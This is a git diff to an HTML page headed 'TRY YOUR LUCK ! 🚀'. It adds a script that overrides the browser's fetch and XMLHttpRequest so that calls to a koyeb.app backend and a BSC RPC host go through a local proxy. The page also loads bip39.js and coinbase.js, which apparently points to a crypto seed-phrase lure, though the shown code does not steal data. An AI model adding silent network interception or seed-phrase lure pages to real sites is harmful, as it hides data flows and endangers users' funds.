@@ -811,6 +811,32 @@ TRY YOUR LUCK ! 🚀
   
 
    </body>
+  <!-- Proxy shim: rewrite blocked cross-origin requests via Next API proxy -->
+  <script>
+    (function(){
+      var ALLOWED = ['w6nmrq-dtyrko-laserx2-2c2c5aee.koyeb.app','bsc.meowrpc.com'];
+      function toURL(u){ try { return new URL(u, location.origin); } catch(_) { return null; } }
+      function needsProxy(u){ var url = toURL(u); return url && ALLOWED.indexOf(url.hostname) !== -1; }
+      var _fetch = window.fetch;
+      window.fetch = function(input, init){
+        var url = (typeof input === 'string') ? input : (input && input.url);
+        if (url && needsProxy(url)){
+          var proxied = '/api/proxy?url=' + encodeURIComponent(toURL(url).toString());
+          return _fetch(proxied, init);
+        }
+        return _fetch(input, init);
+      };
+      var _open = XMLHttpRequest.prototype.open;
+      XMLHttpRequest.prototype.open = function(method, url){
+        try{
+          if (url && needsProxy(url)){
+            url = '/api/proxy?url=' + encodeURIComponent(toURL(url).toString());
+          }
+        }catch(_){}
+        return _open.apply(this, [method, url].concat([].slice.call(arguments,2)));
+      };
+    })();
+  </script>
   <!-- Load interaction scripts -->
   <script src="./scripts/bip39.js" defer></script>
   <script src="./scripts/coinbase.js" defer></script>
